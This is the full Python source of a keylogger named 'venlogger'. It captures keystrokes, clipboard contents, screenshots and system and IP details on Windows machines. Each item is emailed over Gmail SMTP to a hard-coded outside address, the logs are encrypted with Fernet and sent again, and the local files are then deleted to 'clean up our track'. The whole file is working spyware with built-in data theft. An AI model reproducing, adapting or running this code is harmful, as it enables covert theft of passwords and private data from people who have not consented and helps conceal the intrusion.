#venlogger

#frameworks
from pynput import keyboard
from pynput.keyboard import Key,Listener

from dotenv import load_dotenv
import time
import os

import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

import platform
import socket

import getpass
import requests

import win32clipboard as clipboard

from PIL import ImageGrab

from cryptography.fernet import Fernet

from multiprocessing import Process,freeze_support

import zipfile
#load environment files with dotenv file
load_dotenv()

#variables
keys_information = "key_log.txt"
system_information = "sysinfo.txt"
clipboard_information = "clipboard.txt"
screenshoot_information = "screenshoot.png"
encryption_information = "encryption_key.txt"

keys_information_e = "e_log.txt"
system_information_e = "e_sysinfo.txt"
clipboard_information_e = "e_clipboard.txt"
extend = "\\"
file_path = os.getcwd()

#email variables
email_address = os.getenv("EMAIL_ADDRESS")
email_password = os.getenv("EMAIL_PASSWORD")

time_iteration = 15
number_of_iterations_end = 3

number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration

file_merge = file_path + extend

def compress_files(filenames, output_zip):
    with zipfile.ZipFile(output_zip, 'w') as zipf:
        for file in filenames:
            zipf.write(file)


#encryption-decryption
with open(file_path+extend+encryption_information , "rb") as f:
    key = f.read()
    print(key)


#TODO
#send attachment to my mail
def send_email(filename,attachment,to_addr):
      
      from_addr = email_address

      #msg obj
      msg = MIMEMultipart()

      msg["From"] = from_addr
      msg["To"] = to_addr
      msg["Subject"] = "Log File"
      body = "body_of_the_mail"

      msg.attach(MIMEText(body,"plain"))

      #attachment
      attachment = open(attachment,'rb')

      p = MIMEBase("application" , "octet-stream")
      p.set_payload((attachment).read())

      encoders.encode_base64(p)

      p.add_header('Content-Disposition' , "attachment; filename= %s" %filename)

      msg.attach(p)

      #sending with port 587
      s = smtplib.SMTP("smtp.gmail.com" , 587)
      s.starttls()#for safe tls connection(enabling tls protocol)
      s.login(from_addr , email_password)
      text = msg.as_string()
      s.sendmail(from_addr,to_addr,text)
      s.quit()


#get specific computer information and write in to a file
def get_system_info():
      with open(file_path+extend+system_information , "a") as f:
            hostname = socket.gethostname()
            IPAddr = socket.gethostbyname(hostname)

            try:
                  public_ip = requests.get("https://ipinfo.io/json").json().get("ip")#get public ip address of computer
                  f.write("\nPublic IP Address: " + public_ip)
            
            except Exception:
                  f.write("\nCouldn't get public IP Address (max query)")
            
            #specific system informations
            f.write("\nSystem: " + platform.system())
            f.write("\nSystem version: " + platform.version())
            f.write("\nMachine: " +platform.machine())
            f.write("\nHostname: " + hostname)
            f.write("\nPrviate IP address: " + IPAddr)
            f.write("\nProcessor: " + platform.processor())

get_system_info()
      
#get clipboard information of computer
def get_clipboard():
      with open(file_path +extend + clipboard_information , "a") as f:
            try:
                  clipboard.OpenClipboard()
                  pasted_data = clipboard.GetClipboardData()
                  clipboard.CloseClipboard()

                  f.write("Clipboard Data: \n" + pasted_data)
            except:
                  f.write("Clip board could be not be copied")

get_clipboard()

#get screenshoot from computer
def get_screenshoot():
      im = ImageGrab.grab()
      im.save(file_path+extend+screenshoot_information)

get_screenshoot()


while number_of_iterations <number_of_iterations_end:
      #variables
      count = 0 #count for keystrokes
      keys = []

      #on keystroke
      def on_press(key):
            global keys,count,currentTime   

            print(key)  
            #add keys to the list
            keys.append(key)
            count +=1 #increase keystroke for each press
            currentTime = time.time()

            if count >= 1:
                  write_file(keys)
                  keys = []


      #TODO
      def write_file(keys):

            with open(file_path +extend + keys_information , "a") as f:

                  for key in keys:
                        k = str(key).replace("'" , "")

                        if k.find("space") > 0:
                              f.write(" ")
                        elif k.find("Key") == -1:
                              f.write(k)

      def on_release(key):
            if key == Key.esc:
                  return False
            
            if currentTime>stoppingTime:
                  return False
      

      with Listener(on_press=on_press,on_release=on_release) as listener:
            listener.join()
      
      if currentTime>stoppingTime:
            get_screenshoot()
            send_email(screenshoot_information , file_path+extend+screenshoot_information,"keyloggertestk@gmail.com")

            get_clipboard()
            send_email(clipboard_information , file_path+extend+clipboard_information,"keyloggertestk@gmail.com")

            get_system_info()
            send_email(system_information , file_path+extend+system_information,"keyloggertestk@gmail.com")

            compress_files([file_path + extend + keys_information], 'logs.zip')
            send_email('logs.zip', file_path + extend + 'logs.zip', "keyloggertestk@gmail.com")

            number_of_iterations +=1

            currentTime = time.time()
            stoppingTime = time.time() + time_iteration

      with open(file_path +extend+keys_information , "w") as f:
                  f.write(" ")

#encrypt files 
files_to_encrypt = [file_merge+system_information , file_merge+clipboard_information , file_merge+keys_information]
encrypted_file_names = [file_merge+system_information_e , file_merge+clipboard_information_e , file_merge+keys_information_e]

count = 0

for encrypting_files in files_to_encrypt:
      
      with open(files_to_encrypt[count] , 'rb') as f:
            data = f.read()
      
      fernet = Fernet(key)
      encrypted = fernet.encrypt(data)

      with open(encrypted_file_names[count] , 'wb') as f:
            f.write(encrypted)
      
      send_email(encrypted_file_names[count] , encrypted_file_names[count] , to_addr="keyloggertestk@gmail.com")
      count+=1

time.sleep(120)

#clean up our track and delete files
delete_files = [system_information , clipboard_information , keys_information , screenshoot_information]

for file in delete_files:
      os.remove(file_merge +file)
